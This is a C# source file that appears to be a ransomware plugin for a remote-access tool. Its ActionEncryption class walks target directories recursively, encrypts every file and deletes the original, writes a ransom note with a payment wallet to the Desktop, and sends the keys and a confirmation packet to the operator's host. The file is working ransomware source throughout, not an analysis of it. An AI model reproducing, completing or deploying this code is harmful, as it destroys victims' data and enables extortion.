using Newtonsoft.Json;
using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| RSA 470 Bytes buffer explained : https://info.townsendsecurity.com/bid/29195/how-much-data-can-you-encrypt-with-rsa-keys ||
*/

namespace Plugin.Operation
{
    internal class ActionEncryption
    {
        private readonly int BUFFER_CHUNK_SIZE = 10485760;//10MB
        private delegate void ActionDelegate();
        private delegate string FileAction(string path);

        private ActionDelegate actionDelegate;
        private FileAction fileAction;

        private List<string>paths { get; set; }
        private Dictionary<string, string> rsaPair { get; set; }
        private List<string> rsaParsed { get; set; }
        private Dictionary<string, string> results = new Dictionary<string, string>();
        private string message { get; set; }
        private string wallet { get; set; }
        private LoadingAPI loadingAPI { get; set; }
        private string key { get; set; }

        internal ActionEncryption(string publicRSAServerKey, List<string> paths, string message, string wallet, LoadingAPI loadingAPI)
        {
            this.wallet = wallet;
            this.message = message;
            this.paths = paths;
            this.loadingAPI = loadingAPI;

            this.rsaParsed = new List<string>();
            this.rsaPair = Encryption.RSA.GetKey();

            using (Stream stream = new MemoryStream(Encoding.Default.GetBytes(this.rsaPair["PrivateKey"]))) 
            {
                byte[] buffer = new byte[470];

                int bytesRead = 0;
                long currentOffset = 0;
                long totalSize = Encoding.Default.GetBytes(this.rsaPair["PrivateKey"]).Length;

                if (totalSize > 470)
                {
                    while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        byte[] encrypted = Encryption.RSA.RSAEncrypt(buffer, publicRSAServerKey);

                        rsaParsed.Add(Convert.ToBase64String(encrypted));

                        currentOffset += bytesRead;
                        totalSize -= bytesRead;
                        if (totalSize < 470)
                            buffer = new byte[totalSize];
                    }
                }
                else
                {
                    buffer = new byte[totalSize];
                    bytesRead = stream.Read(buffer, 0, buffer.Length);

                    byte[] encrypted = Encryption.RSA.RSAEncrypt(buffer, publicRSAServerKey);
                    rsaParsed.Add(Convert.ToBase64String(encrypted));

                }
                stream.Dispose();
                stream.Close();
            }

            this.rsaPair["PrivateKey"] = null;
            this.actionDelegate = new ActionDelegate(Do);
            this.fileAction = new FileAction(FileEncryptionOperated);
        }

        internal void StartAction() 
        {
            this.actionDelegate.BeginInvoke(new AsyncCallback(EndAction), null);
        }

        private void AppendToFile(string fileToWrite, byte[] data)
        {
            using (FileStream FS = new FileStream(fileToWrite, File.Exists(fileToWrite) ? FileMode.Append : FileMode.OpenOrCreate, FileAccess.Write))
            {
                FS.Write(data, 0, data.Length);
                FS.Dispose();
                FS.Close();
            }
        }

        private bool CheckFileBeforeEncryption() 
        {
            //
            return true;
        }

        private void Do()
        {
            Dictionary<string, string> results = new Dictionary<string, string>();

            foreach (string dirPath in paths) 
            {
                foreach (string file in Directory.GetFiles(dirPath, "*.*", SearchOption.AllDirectories))
                {
                    IAsyncResult ar = this.fileAction.BeginInvoke(file, null, null);
                    string key = this.fileAction.EndInvoke(ar);
                    this.results.Add(file, key);
                }
            }
        }

        private string FileEncryptionOperated(string path) 
        {
            //lock file with native imports
            string generateKey = KeyGenerator.GenerateKey();
            using (Stream source = File.OpenRead(path))
            {
                byte[] buffer = new byte[BUFFER_CHUNK_SIZE];
                int bytesRead = 0;
                long currentOffset = 0;
                long totalSize = new FileInfo(path).Length;

                if (totalSize > BUFFER_CHUNK_SIZE)
                {
                    while ((bytesRead = source.Read(buffer, 0, buffer.Length)) > 0)
                    {            
                        byte[] encrypted = Encryption.RSM.RSMEncrypt(buffer, Encoding.Unicode.GetBytes(generateKey));
                        AppendToFile(path + ".encrypted", encrypted);

                        currentOffset += bytesRead;
                        totalSize -= bytesRead;
                        if (totalSize < BUFFER_CHUNK_SIZE)
                            buffer = new byte[totalSize];
                    }
                }
                else
                {
                    buffer = new byte[totalSize];
                    bytesRead = source.Read(buffer, 0, buffer.Length);

                    byte[] encrypted = Encryption.RSM.RSMEncrypt(buffer, Encoding.Unicode.GetBytes(generateKey));
                    AppendToFile(path + ".encrypted", encrypted);
                }
                source.Dispose();
                source.Close();
            }
            File.Delete(path);
            return Convert.ToBase64String(Encryption.RSA.RSAEncrypt(Encoding.Unicode.GetBytes(generateKey), this.rsaPair["PublicKey"]));
        }

        private void EndAction(IAsyncResult ar) 
        {
            actionDelegate.EndInvoke(ar);

            Encryption.Encrypted encrypted = new Encryption.Encrypted();
            encrypted.clientRSAPrivate = this.rsaParsed;
            encrypted.encryptedData = this.results;

            string fullResults = JsonConvert.SerializeObject(encrypted);
            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\encrypted.json", fullResults);

            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Notes.txt", this.wallet + Environment.NewLine + Environment.NewLine + this.message);

            Launch.ClientSender(this.loadingAPI.Host, this.loadingAPI.Key, new RansomwareConfirmationPacket(PacketType.RANSOMWARE_ENCRYPTION_CONFIRMATION, fullResults, this.loadingAPI.BaseIp, this.loadingAPI.HWID));
        }
    }
}
